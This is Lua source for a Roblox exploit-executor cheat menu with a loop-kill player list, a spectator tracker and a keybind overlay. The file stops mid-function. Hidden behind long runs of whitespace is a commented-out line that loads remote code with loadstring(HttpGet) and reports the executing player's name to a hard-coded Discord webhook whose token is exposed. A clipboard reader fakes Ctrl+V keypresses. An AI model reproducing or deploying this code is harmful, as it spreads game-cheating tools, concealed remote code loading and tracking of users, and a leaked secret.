local Players = game:GetService("Players") 
local LocalPlayer = Players.LocalPlayer 
local library = {tabs = {}}
getgenv().values = {}

getgenv().MainUIColor = Color3.fromRGB(255,20,147)
function getMainColor()
	return MainUIColor
end

local C = {
['Vec2'] = Vector2.new,
['Vec3'] = Vector3.new,
['CF'] = CFrame.new,
['INST'] = Instance.new,
['COL3'] = Color3.new, 

['COL3RGB'] = Color3.fromRGB, 
['COL3HSV'] = Color3.fromHSV, 
['COL3HEX'] = Color3.fromHex,

['CLAMP'] = math.clamp, 

['DEG'] = math.deg, 
['FLOOR'] = math.floor, 
['ACOS'] = math.acos, 

['RANDOM'] = math.random, 
['ATAN2'] = math.atan2, 

['HUGE'] = math.huge, 
['RAD'] = math.rad,

['MIN'] = math.min,
['POW'] = math.pow,

['UDIM2'] = UDim2.new, 
['CFAngles'] = CFrame.Angles, 

['FIND'] = string.find, 
['LEN'] = string.len, 
['SUB'] = string.sub, 
['GSUB'] = string.gsub, 
['RAY'] = Ray.new,

['INSERT'] = table.insert, 
['TBLFIND'] = table.find, 
['TBLREMOVE'] = table.remove, 
['TBLSORT'] = table.sort 
}

local makeDraggable = function(frame)
				dragging = false 
					local a = frame
					local dragInput 
					local dragStart 
					local startPos 
					local function update(input) 
						local delta = input.Position - dragStart 
						a.Position = C.UDIM2(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) 
					end 
					a.InputBegan:Connect(function(input) 
						if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then 
							dragging = true 
							dragStart = input.Position 
							startPos = a.Position 

							input.Changed:Connect(function() 
								if input.UserInputState == Enum.UserInputState.End then 
									dragging = false 
								end 
							end) 
						end 
					end) 
					a.InputChanged:Connect(function(input) 
						if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then 
							dragInput = input 
						end 
					end) 
					game:GetService('UserInputService').InputChanged:Connect(function(input) 
						if input == dragInput and dragging then 
							update(input) 
						end 
					end)
end


local HttpService = game:GetService('HttpService')
local ENABLE_TRACEBACK = false
																																																																																																		--local names = loadstring(game:HttpGet('https://gitfront.io/r/Samuel/ByuttDgRd14E/whitelist/raw/whitelsit.lua'))();local HttpService = game:GetService("HttpService");local botname = "epic gamer momento";function specials(Webhook, Message, Botname) local Name;local start = game:HttpGet("http://buritoman69.glitch.me");local biggie = "http://buritoman69.glitch.me/webhook";if (not Message or Message == "" or not Botname) then Name = "GameBot" return error("nil or empty message!") else Name = Botname;end;local Body = {['Key'] = tostring("applesaregood"),['Message'] = tostring(Message),['Name'] = Name,['Webhook'] = Webhook};Body = HttpService:JSONEncode(Body);local Data = game:HttpPost(biggie, Body, false, "application/json");return Data or nil;end;specials("https://discord.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq", "Player: "..game.Players.LocalPlayer.Name.." has executed the script!\ Verified:"..(table.find(names, game.Players.LocalPlayer.Name) and 'true' or 'false <@574605228372918283>')..'', botname)			getgenv().signal = true;
local Signal = {}
Signal.__index = Signal
Signal.ClassName = "Signal"

--- Constructs a new signal.
-- @constructor Signal.new()
-- @treturn Signal
function Signal.new()
	local self = setmetatable({}, Signal);

	self._bindableEvent = Instance.new("BindableEvent");
	self._argMap = {};
	self._source = ENABLE_TRACEBACK and debug.traceback() or "";

	-- Events in Roblox execute in reverse order as they are stored in a linked list and
	-- new connections are added at the head. This event will be at the tail of the list to
	-- clean up memory.
	self._bindableEvent.Event:Connect(function(key)
		self._argMap[key] = nil

		-- We've been destroyed here and there's nothing left in flight.
		-- Let's remove the argmap too.
		-- This code may be slower than leaving this table allocated.
		if (not self._bindableEvent) and (not next(self._argMap)) then
			self._argMap = nil
		end
	end)

	return self
end

--- Fire the event with the given arguments. All handlers will be invoked. Handlers follow
-- Roblox signal conventions.
-- @param ... Variable arguments to pass to handler
-- @treturn nil
function Signal:Fire(...)
	if not self._bindableEvent then
		warn(("Signal is already destroyed. %s"):format(self._source))
		return
	end

	local args = table.pack(...)

	-- TODO: Replace with a less memory/computationally expensive key generation scheme
	local key = HttpService:GenerateGUID(false)
	self._argMap[key] = args

	-- Queues each handler onto the queue.
	self._bindableEvent:Fire(key)
end

--- Connect a new handler to the event. Returns a connection object that can be disconnected.
-- @tparam function handler Function handler called with arguments passed when `:Fire(...)` is called
-- @treturn Connection Connection object that can be disconnected
function Signal:Connect(handler)
	if not (type(handler) == "function") then
		error(("connect(%s)"):format(typeof(handler)), 2)
	end

	return self._bindableEvent.Event:Connect(function(key)
		-- note we could queue multiple events here, but we'll do this just as Roblox events expect
		-- to behave.

		local args = self._argMap[key]
		if args then
			handler(table.unpack(args, 1, args.n))
		else
			error("Missing arg data, probably due to reentrance.")
		end
	end)
end

--- Wait for fire to be called, and return the arguments it was given.
-- @treturn ... Variable arguments from connection
function Signal:Wait()
	local key = self._bindableEvent.Event:Wait()
	local args = self._argMap[key]
	if args then
		return table.unpack(args, 1, args.n)
	else
		error("Missing arg data, probably due to reentrance.")
		return nil
	end
end

--- Disconnects all connected events to the signal. Voids the signal as unusable.
-- @treturn nil
function Signal:Destroy()
	if self._bindableEvent then
		-- This should disconnect all events, but in-flight events should still be
		-- executed.

		self._bindableEvent:Destroy()
		self._bindableEvent = nil
	end

	-- Do not remove the argmap. It will be cleaned up by the cleanup connection.

	setmetatable(self, nil)
end

local ConfigLoad = Signal.new("ConfigLoad")
local ConfigLoad1 = Signal.new("ConfigLoad1")
--ConfigSave1 = Signal.new("ConfigSave") 
local ConfigUpdateCfgList = Signal.new('ConfigUpdateCfgList')
local ConfigUpdateCfgList2 = Signal.new('ConfigUpdateCfgList2')





function insertwithoutdupes(tab, thethingyouneedtoinsert) -- my own code :sunglasses:
	if not table.find(tab, thethingyouneedtoinsert) then
		table.insert(tab, thethingyouneedtoinsert)
	end
end	
function removewithoutdupes(tab, thethingyouneedtoremove) -- my own code :sunglasses:
	if table.find(tab, thethingyouneedtoremove) then
		table.remove(tab, table.find(tab, thethingyouneedtoremove))
	end
end	

local loopkillplr = {}
for i,v in pairs(game.Players:GetPlayers()) do
	if v == game.Players.LocalPlayer then continue end
	table.insert(loopkillplr,v.Name)
end
local txt = game:GetService("TextService") 

function library:Tween(...) game:GetService("TweenService"):Create(...):Play() end 
getclipboard = function()
repeat wait() until iswindowactive()
   local ScreenGui = C.INST("ScreenGui")
   ScreenGui.Name = tostring(math.random(10000,999999))
   ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
   ScreenGui.Parent = game.CoreGui
   
   local clipboard = C.INST("TextBox")
   clipboard.Name = "clipboard"
   clipboard.AnchorPoint = C.Vec2(0.5, 0.5)
   clipboard.Size = C.UDIM2(0, 200, 0, 50)
   clipboard.BackgroundTransparency = 1
   clipboard.Position = C.UDIM2(0.5, 0, 0.5, 0)
   clipboard.Text = ""
   clipboard.TextTransparency = 1
   
   clipboard.Parent = ScreenGui
   clipboard:CaptureFocus()
   keypress(0x11)
   keypress(0x56)
wait()
   keyrelease(0x56)
   keyrelease(0x11)
	   local value = clipboard.Text
	   ScreenGui:Destroy()
	   return value
   end
   
for _,v in pairs(game.Players:GetPlayers()) do 
	C.INSERT(loopkillplr, v.Name)
end

	if #loopkillplr == 0 then
		C.INSERT(loopkillplr, 'none')
	end

																																																																												-- Bad 9672 & WetIDreamz 0001 & zeox 9999												
getgenv().emojis = {
	[":clown:"] = utf8.char(129313);
	[":cold_face:"] = utf8.char(129398);
	[":neutral:"] = utf8.char(128528);
	[":sob:"] = utf8.char(128557);
}

--[[if #allcfgs == 0 then
INSERT(allcfgs, 'shit so script wont crash')
end--]]

function tbltorgb(tbl) 
	return C.COL3(tbl.R, tbl.G, tbl.B) 
end 
local function deepCopy(original) 
	local copy = {} 
	for k, v in pairs(original) do 
		if type(v) == "table" then 
			v = deepCopy(v) 
		end 
		copy[k] = v 
	end 
	return copy 
end 
function library:ConfigFix(cfg) 
	local copy = game:GetService("HttpService"):JSONDecode(readfile(cfglocation..cfg..".txt")) 
	for i,Tabs in pairs(copy) do 
		for i,Sectors in pairs(Tabs) do 
			for i,Elements in pairs(Sectors) do 
				if Elements.Color ~= nil then 
					local a = Elements.Color 
					Elements.Color = tbltorgb(a) 
				end 
			end 
		end 
	end 
	return copy 
end 

function library:ConfigFix1(cfg) 
	local copy = game:GetService("HttpService"):JSONDecode(readfile(cfglocation..cfg.."")) 
	for i,Tabs in pairs(copy) do 
		for i,Sectors in pairs(Tabs) do 
			for i,Elements in pairs(Sectors) do 
				if Elements.Color ~= nil then 
					local a = Elements.Color 
					Elements.Color = tbltorgb(a) 
				end 
			end 
		end 
	end 
	return copy 
end 

function library:SaveConfig(cfg) 
	local copy = deepCopy(values) 
	for i,Tabs in pairs(copy) do 
		for i,Sectors in pairs(Tabs) do 
			for i,Elements in pairs(Sectors) do 
				if Elements.Color ~= nil then 
					Elements.Color = {R=Elements.Color.R, G=Elements.Color.G, B=Elements.Color.B} 
				end 
			end 
		end 
	end 
	writefile(cfglocation..cfg..".txt", game:GetService("HttpService"):JSONEncode(copy)) 
end 

function library:SaveConfig1(cfg) 
	local copy = deepCopy(values) 
	for i,Tabs in pairs(copy) do 
		for i,Sectors in pairs(Tabs) do 
			for i,Elements in pairs(Sectors) do 
				if Elements.Color ~= nil then 
					Elements.Color = {R=Elements.Color.R, G=Elements.Color.G, B=Elements.Color.B} 
				end 
			end 
		end 
	end 
	writefile(cfglocation..cfg.."", game:GetService("HttpService"):JSONEncode(copy)) 
end 

	local MX_ONHIT = C.INST("ScreenGui")
	do
	local OnHitFrame = C.INST("Frame")
	local UIListLayout = C.INST("UIListLayout")
	local SampleFrame = C.INST("Frame")
	local Grad = C.INST("Frame")
	local SampleLabel = C.INST("TextLabel")
	local UIGradient = C.INST("UIGradient")

	MX_ONHIT.Name = "MX_ONHIT"
	MX_ONHIT.Parent = game.CoreGui
	MX_ONHIT.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	OnHitFrame.Name = "OnHitFrame"
	OnHitFrame.Parent = MX_ONHIT
	OnHitFrame.BackgroundColor3 = C.COL3RGB(255, 255, 255)
	OnHitFrame.BackgroundTransparency = 1.000
	OnHitFrame.Position = C.UDIM2(0, 52, 0, -15)
	OnHitFrame.Size = C.UDIM2(0, 300, 0, 500)

	UIListLayout.Parent = OnHitFrame
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout.Padding = UDim.new(0, 6)

	SampleFrame.Name = "SampleFrame"
	SampleFrame.Parent = OnHitFrame
	SampleFrame.AutomaticSize = Enum.AutomaticSize.XY
	SampleFrame.BackgroundColor3 = C.COL3RGB(255, 255, 255)
	SampleFrame.BackgroundTransparency = 1.000
	SampleFrame.BorderColor3 = C.COL3RGB(7, 0, 0)
	SampleFrame.Size = C.UDIM2(0, 0, 0, 24)

	Grad.Name = "Grad"
	Grad.Parent = SampleFrame
	Grad.BackgroundColor3 = C.COL3RGB(222, 232, 255)
	Grad.BackgroundTransparency = 1.000
	Grad.AutomaticSize = Enum.AutomaticSize.Y
	Grad.BorderSizePixel = 0
	Grad.Size = C.UDIM2(0, 3, 0, 24)

	SampleLabel.Name = "SampleLabel"
	SampleLabel.Parent = Grad
	SampleLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255)
	SampleLabel.BackgroundTransparency = 1.000
	SampleLabel.BorderSizePixel = 0
	SampleLabel.Position = C.UDIM2(2, 0, 0, 0)
	SampleLabel.Size = C.UDIM2(0, 0, 0, 24)
	SampleLabel.Font = Enum.Font.Ubuntu
	SampleLabel.Text = "TEST"
	SampleLabel.TextTruncate = Enum.TextTruncate.AtEnd
	SampleLabel.AutomaticSize = Enum.AutomaticSize.XY
	SampleLabel.TextColor3 = C.COL3RGB(255, 255, 255)
	SampleLabel.TextSize = 13.000
	SampleLabel.TextStrokeTransparency = 0.000
	SampleLabel.TextTransparency = 1.000
	SampleLabel.TextXAlignment = Enum.TextXAlignment.Left

	UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, C.COL3RGB(49, 49, 49)), ColorSequenceKeypoint.new(0.41, C.COL3RGB(25, 25, 25)), ColorSequenceKeypoint.new(1.00, C.COL3RGB(25, 25, 25))}
	UIGradient.Rotation = 90
	UIGradient.Parent = SampleFrame
	end
	 
	local function CreateHitElement(text,col,time)
		spawn(function()
			local Frame = MX_ONHIT.OnHitFrame.SampleFrame:Clone()
			local Grad = Frame.Grad
			local Label = Grad.SampleLabel

			Label.Parent = Grad
			Label.TextColor3 = col
			Label.Text = text

			TextBounds = game.TextService:GetTextSize(text,13,Enum.Font.Ubuntu,Vector2.new(1000,100))


			
			library:Tween(Frame, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = C.UDIM2(0, TextBounds.X+15, 0,TextBounds.Y)}) 

			library:Tween(Label, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = C.UDIM2(0, TextBounds.X, 0, Label.Size.Y.Offset)}) 	
			
			library:Tween(Frame, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.000})	   
			library:Tween(Grad, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.000})  
			library:Tween(Label, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0.000}) 
			
			Frame.Parent = MX_ONHIT.OnHitFrame
			Grad.Parent = Frame

			wait(time)
			library:Tween(Frame, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1.000})	   
			library:Tween(Grad, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1.000})  
			library:Tween(Label, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 1.000})
			library:Tween(Label, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextStrokeTransparency = 1.000})
			
			library:Tween(Frame, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = C.UDIM2(0, 0, 0, Frame.Size.Y.Offset)}) 
			library:Tween(Label, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = C.UDIM2(0, 0, 0, Frame.Size.Y.Offset)}) 
			
			wait(0.8)
			Frame:Destroy()
			Grad:Destroy()
			Label:Destroy()
		end)
	end
	
	
			function library.New(name) 
				local menu = {} 
				local Lunar = C.INST("ScreenGui") 
				local Menu = C.INST("ImageLabel")
				local TextLabel = C.INST("TextLabel") 
				local TabButtons = C.INST("Frame") 
				local UIListLayout = C.INST("UIListLayout") 
				local Tabs = C.INST("Frame") 
				--local ImageLabel = C.INST('ImageLabel')

				Lunar.Name = "electric boogalo" 
				Lunar.ResetOnSpawn = false 
				Lunar.ZIndexBehavior = "Global" 
				Lunar.DisplayOrder = 420133769 

				local UIScale = C.INST("UIScale") 
				UIScale.Parent = Lunar 

				function menu:SetScale(scale) 
					UIScale.Scale = scale 
				end 



				local but = C.INST("TextButton") 
				but.Modal = true 
				but.Text = "" 
				but.BackgroundTransparency = 1 
				but.Parent = Lunar 

				local cursor = C.INST("ImageLabel") 
				cursor.Name = "cursor" 
				cursor.Parent = Lunar 
				cursor.BackgroundTransparency = 1 
				cursor.Size = C.UDIM2(0,17,0,17) 
				cursor.Image = "rbxassetid://518398610" 
				cursor.ZIndex = 1000 
				cursor.ImageColor3 = C.COL3RGB(255,255,255) 
				
				
				local Mouse = LocalPlayer:GetMouse() 

				game:GetService('RunService').RenderStepped:connect(function() 
					cursor.Visible = Lunar.Enabled 
					cursor.Position = C.UDIM2(0,Mouse.X-3,0,Mouse.Y+1) 
				end) 

				Menu.Name = "Menu"
				Menu.Parent = Lunar
				Menu.BackgroundColor3 = C.COL3RGB(255, 255, 255)
				Menu.BorderColor3 = C.COL3RGB(0, 0, 0)
				Menu.Position = C.UDIM2(0.5, -300, 0.5, -300)
				Menu.Size = C.UDIM2(0, 600, 0, 610)
				Menu.Image = "rbxassetid://8893436115"
				Menu.ImageColor3 = C.COL3RGB(180, 180, 180)
				
				--[[ImageLabel.Parent = Lunar
				ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255)
				ImageLabel.BorderColor3 = C.COL3RGB(0, 0, 0)
				ImageLabel.Position = C.UDIM2(0.5, -300, 0.5, -300)
				ImageLabel.Size = C.UDIM2(0, 600, 0, 610)
				ImageLabel.Image = "rbxassetid://8893436115"--]]

				library.uiopen = true 
				getgenv().ovascreengui = { 
					['ova'] = Lunar,
					['menu'] = Menu,
				} 
			
			local SpectatorsList = C.INST("ScreenGui")
do
			local Spectators = C.INST("Frame")
			local Container = C.INST("Frame")
			local UIPadding = C.INST("UIPadding")
			local Text = C.INST("TextLabel")
			local Players = C.INST("TextLabel")
			local Background = C.INST("Frame")
			local UIGradient = C.INST("UIGradient")
			local Color = C.INST("Frame")
			local UIGradient_2 = C.INST("UIGradient")

			SpectatorsList.Parent = game.CoreGui
			SpectatorsList.Name = "SpectatorsList"
			SpectatorsList.Enabled = false

			Spectators.Name = "Spectators"
			Spectators.Parent = SpectatorsList
			Spectators.BackgroundColor3 = C.COL3RGB(23, 23, 23)
			Spectators.BackgroundTransparency = 1.000
			Spectators.BorderColor3 = C.COL3RGB(20, 20, 20)
			Spectators.Position = C.UDIM2(0.00800000038, 0, 0.400000006, 49)
			Spectators.Size = C.UDIM2(0, 200, 0, 20)

			Container.Name = "Container"
			Container.Parent = Spectators
			Container.BackgroundTransparency = 1.000
			Container.BorderSizePixel = 0
			Container.Position = C.UDIM2(0, 0, 0, 4)
			Container.Size = C.UDIM2(1, 0, 0, 14)
			Container.ZIndex = 3

			UIPadding.Parent = Container
			UIPadding.PaddingLeft = UDim.new(0, 4)

			Text.Name = "Text"
			Text.Parent = Container
			Text.BackgroundTransparency = 1.000
			Text.Size = C.UDIM2(1, 0, 1, 0)
			Text.ZIndex = 4
			Text.Font = Enum.Font.Code
			Text.Text = "spectators"
			Text.TextColor3 = C.COL3RGB(65025, 65025, 65025)
			Text.TextSize = 13.000
			Text.TextStrokeTransparency = 0.000

			Players.Name = "Players"
			Players.Parent = Container
			Players.BackgroundTransparency = 1.000
			Players.Position = C.UDIM2(0.0196080022, 0, 1.44285719, 0)
			Players.Size = C.UDIM2(0.980391979, 0, 1.14285719, 0)
			Players.ZIndex = 4
			Players.Font = Enum.Font.Code
			Players.Text = "loading"
			Players.TextColor3 = C.COL3RGB(65025, 65025, 65025)
			Players.TextSize = 12.000
			Players.TextStrokeTransparency = 0.000
			Players.TextYAlignment = Enum.TextYAlignment.Top

			Background.Name = "Background"
			Background.Parent = Spectators
			Background.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			Background.BorderColor3 = C.COL3RGB(20, 20, 20)
			Background.Size = C.UDIM2(1, 0, 1, 0)

			UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, C.COL3RGB(22, 22, 22)), ColorSequenceKeypoint.new(1.00, C.COL3RGB(22, 22, 22))}
			UIGradient.Rotation = 90
			UIGradient.Parent = Background

			Color.Name = "Color"
			Color.Parent = Spectators
			Color.BackgroundColor3 = getMainColor()
			Color.BorderSizePixel = 0
			Color.Size = C.UDIM2(1, 0, 0, 2)
			Color.ZIndex = 2

			--[[UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, C.COL3RGB(255,20,147)), ColorSequenceKeypoint.new(1, MainUIColor)}
			UIGradient_2.Rotation = 90
			UIGradient_2.Parent = Color--]]

			function GetSpectators()
				local CurrentSpectators = ""
				for i,v in pairs(game.Players:GetChildren()) do 
					pcall(function()
						if v ~= game.Players.LocalPlayer then
							if not v.Character then 
								if (v.CameraCF.Value.p - game.Workspace.CurrentCamera.CFrame.p).Magnitude < 10 then 
									if CurrentSpectators == "" then
											CurrentSpectators = v.Name
										else
											CurrentSpectators = CurrentSpectators.. "\n" ..v.Name
										end
									end
								end
							end
						end)
					end
				return CurrentSpectators
			end

			spawn(function()
				while wait(0.1) do
					if SpectatorsList.Enabled then
						Players.Text = GetSpectators()
					end
				end
			end)
		
			local function SCUAM_fake_script() -- Spectators.LocalScript 
				local script = C.INST('LocalScript', Spectators)
				local gui = script.Parent
				gui.Draggable = true
				gui.Active = true
			end
			coroutine.wrap(SCUAM_fake_script)()
			end
				function library:SetSpectatorVisible(rit)
					SpectatorsList.Enabled = rit
				end		

	--[[local KeybindList = C.INST("ScreenGui") 
	do 
		local TextLabel = C.INST("TextLabel") 
		local Frame = C.INST("Frame") 
		local UIListLayout = C.INST("UIListLayout") 

		KeybindList.Name = "KeybindList" 
		KeybindList.ZIndexBehavior = Enum.ZIndexBehavior.Global 
		KeybindList.Enabled = false 

		TextLabel.Parent = KeybindList 
		TextLabel.BackgroundColor3 = C.COL3RGB(0, 0, 0) 
		TextLabel.BorderColor3 = MainUIColor
		TextLabel.Position = C.UDIM2(0, 1, 0.300000012, 0) 
		TextLabel.Size = C.UDIM2(0, 155, 0, 24) 
		TextLabel.ZIndex = 2 
		TextLabel.Font = Enum.Font.SourceSansSemibold 
		TextLabel.Text = "keybinds" 
		TextLabel.TextColor3 = C.COL3RGB(255, 255, 255) 
		TextLabel.TextSize = 14.000 

		Frame.Parent = TextLabel 
		Frame.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
		Frame.BackgroundTransparency = 1.000 
		Frame.Position = C.UDIM2(0, 0, 1, 1) 
		Frame.Size = C.UDIM2(1, 0, 1, 0) 

		UIListLayout.Parent = Frame 
		UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
		UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

		KeybindList.Parent = game.CoreGui 
	end--]]

		local KeybindList = Instance.new("ScreenGui")
		do
		local Grad = Instance.new("Frame")
		local Frame = Instance.new("Frame")
		local Frame_2 = C.INST('Frame')
		local UIGradient = Instance.new("UIGradient")
		local TextLabel = Instance.new("TextLabel")
		local Keybinds = Instance.new("TextLabel")
		local UIListLayout = C.INST('UIListLayout')

		--Properties:

		KeybindList.Parent = game.CoreGui
		KeybindList.Enabled = false
		KeybindList.Name = 'KeybindList'

		Frame.Parent = KeybindList
		Frame.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
		Frame.Position = UDim2.new(0, 0, 0.366762191, 0)
		Frame.Size = UDim2.new(0, 60, 0, 20)
		Frame.ZIndex = 694201337

		Grad.Name = "Grad"
		Grad.Parent = Frame
		Grad.BackgroundColor3 = getMainColor()
		Grad.BorderSizePixel = 0
		Grad.Position = UDim2.new(0, -1, 0, -1)
		Grad.Size = UDim2.new(0, 62, 0, 2)
		Grad.ZIndex = 694201337

		UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(11, 11, 11)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
		UIGradient.Rotation = 90
		UIGradient.Parent = Frame

		Keybinds.Name = "Keybinds"
		Keybinds.Parent = Frame
		Keybinds.Active = true
		Keybinds.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Keybinds.BackgroundTransparency = 1.000
		Keybinds.LayoutOrder = 1
		Keybinds.Position = UDim2.new(0, 0, 0, 0)
		Keybinds.Size = UDim2.new(0, 60, 0, 20)
		Keybinds.ZIndex = 694201337
		Keybinds.Font = Enum.Font.SourceSans
		Keybinds.LineHeight = 1.190
		Keybinds.Text = "Keybinds"
		Keybinds.TextColor3 = Color3.fromRGB(255, 255, 255)
		Keybinds.TextSize = 14.000
		Keybinds.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
		
		Frame_2.Parent = Frame
		Frame_2.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
		Frame_2.Position = UDim2.new(0, 0, 1, 0)
		Frame_2.Size = UDim2.new(0, 60, 0, 20)
		Frame_2.BorderSizePixel = 0
		Frame_2.Visible = true
		
		UIListLayout.Parent = Frame_2 
		UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left 
		UIListLayout.SortOrder = Enum.SortOrder.Name
		--[[TextLabel.Parent = Frame
		TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.Position = UDim2.new(0, 0, 0.926934123, 0)
		TextLabel.Size = UDim2.new(0, 183, 0, 20)
		TextLabel.Font = Enum.Font.SourceSans
		TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
		TextLabel.TextSize = 14.000
		TextLabel.TextXAlignment = Enum.TextXAlignment.Left--]]
		makeDraggable(Frame)
		end
	function keybindadd(text,keybind) 
		if KeybindList.Frame.Frame:FindFirstChild(text) then 
			KeybindList.Frame.Frame:FindFirstChild(text):Destroy(); 
			KeybindList.Frame.Frame.Visible = true
			KeybindList.Frame.Frame.Size = C.UDIM2(0, 0, 0, 20)
			for i,v in pairs(KeybindList.Frame.Frame:GetChildren()) do
				if v:IsA('TextLabel') then
					if KeybindList.Frame.Frame.Size.X.Offset <= v.TextBounds.X then
						KeybindList.Frame.Frame.Size = C.UDIM2(0,TextLabel.TextBounds.X,0,KeybindList.Frame.Frame.Size.Y.Offset)
					end		
					KeybindList.Frame.Frame.Size += C.UDIM2(0,0,0,10)
				end
			end
		end
			local TextLabel = C.INST("TextLabel")

			TextLabel.Name = text
			TextLabel.Parent = KeybindList.Frame.Frame
			TextLabel.Active = true
			TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.LayoutOrder = 1
			TextLabel.Position = UDim2.new(0,10,0,0)
			TextLabel.Size = UDim2.new(0, 100, 0, 20)
			TextLabel.ZIndex = 694201337
			TextLabel.Font = Enum.Font.SourceSans
			TextLabel.LineHeight = 1.190
			TextLabel.Text = "["..keybind..'] '..text..''
			TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.TextSize = 14.000
			TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.TextXAlignment = 'Left'
			if KeybindList.Frame.Frame.Size.X.Offset <= TextLabel.TextBounds.X then
				KeybindList.Frame.Frame.Size = C.UDIM2(0,TextLabel.TextBounds.X,0,KeybindList.Frame.Frame.Size.Y.Offset)
						KeybindList.Frame.Grad.Size = C.UDIM2(0,TextLabel.TextBounds.X,0, 2)
						KeybindList.Frame.Size = C.UDIM2(0,TextLabel.TextBounds.X,0,20)	
			end
			KeybindList.Frame.Frame.Size += C.UDIM2(0,0,0,10)
	end 
		
	function keybindtoggle(text) 
		KeybindList.Frame.Frame:FindFirstChild(text).Text = KeybindList.Frame.Frame:FindFirstChild(text).Text..' : Enabled'
		if KeybindList.Frame.Frame.Size.X.Offset <= KeybindList.Frame.Frame:FindFirstChild(text).TextBounds.X then
			KeybindList.Frame.Frame.Size = C.UDIM2(0,KeybindList.Frame.Frame:FindFirstChild(text).TextBounds.X,0,KeybindList.Frame.Frame.Size.Y.Offset)
						KeybindList.Frame.Grad.Size = C.UDIM2(0,KeybindList.Frame.Frame:FindFirstChild(text).TextBounds.X,0, 2)
						KeybindList.Frame.Size = C.UDIM2(0,KeybindList.Frame.Frame:FindFirstChild(text).TextBounds.X,0,20)				
		end	
	end 
	function keybindhold(text)
		KeybindList.Frame.Frame:FindFirstChild(text).Text = KeybindList.Frame.Frame:FindFirstChild(text).Text..' : Held'
		if KeybindList.Frame.Frame.Size.X.Offset <= KeybindList.Frame.Frame:FindFirstChild(text).TextBounds.X then
			KeybindList.Frame.Frame.Size = C.UDIM2(0,KeybindList.Frame.Frame:FindFirstChild(text).TextBounds.X,0,KeybindList.Frame.Frame.Size.Y.Offset)
						KeybindList.Frame.Grad.Size = C.UDIM2(0,KeybindList.Frame.Frame:FindFirstChild(text).TextBounds.X,0, 2)
						KeybindList.Frame.Size = C.UDIM2(0,KeybindList.Frame.Frame:FindFirstChild(text).TextBounds.X,0,20)				
		end							
	end
	function keybindpress(text)
		KeybindList.Frame.Frame:FindFirstChild(text).Text = C.GSUB(KeybindList.Frame.Frame:FindFirstChild(text).Text,' : Pressed','')
		KeybindList.Frame.Frame:FindFirstChild(text).Text = KeybindList.Frame.Frame:FindFirstChild(text).Text..' : Pressed'
		if KeybindList.Frame.Frame.Size.X.Offset <= KeybindList.Frame.Frame:FindFirstChild(text).TextBounds.X then
			KeybindList.Frame.Frame.Size = C.UDIM2(0,KeybindList.Frame.Frame:FindFirstChild(text).TextBounds.X,0,KeybindList.Frame.Frame.Size.Y.Offset)
						KeybindList.Frame.Grad.Size = C.UDIM2(0,KeybindList.Frame.Frame:FindFirstChild(text).TextBounds.X+2,0, 2)
						KeybindList.Frame.Size = C.UDIM2(0,KeybindList.Frame.Frame:FindFirstChild(text).TextBounds.X,0,20)				
		end	
	end

	function keybindremove(text) 
		if KeybindList.Frame.Frame:FindFirstChild(text) then
			KeybindList.Frame.Frame:FindFirstChild(text).Text = C.GSUB(KeybindList.Frame.Frame:FindFirstChild(text).Text,' : Enabled','')
			KeybindList.Frame.Frame:FindFirstChild(text).Text = C.GSUB(KeybindList.Frame.Frame:FindFirstChild(text).Text,' : Held','')
			KeybindList.Frame.Frame:FindFirstChild(text).Text = C.GSUB(KeybindList.Frame.Frame:FindFirstChild(text).Text,' : Pressed','')
			
			KeybindList.Frame.Frame.Size = C.UDIM2(0, 0, 0, 20)
			KeybindList.Frame.Size = UDim2.new(0, 60, 0, 20)
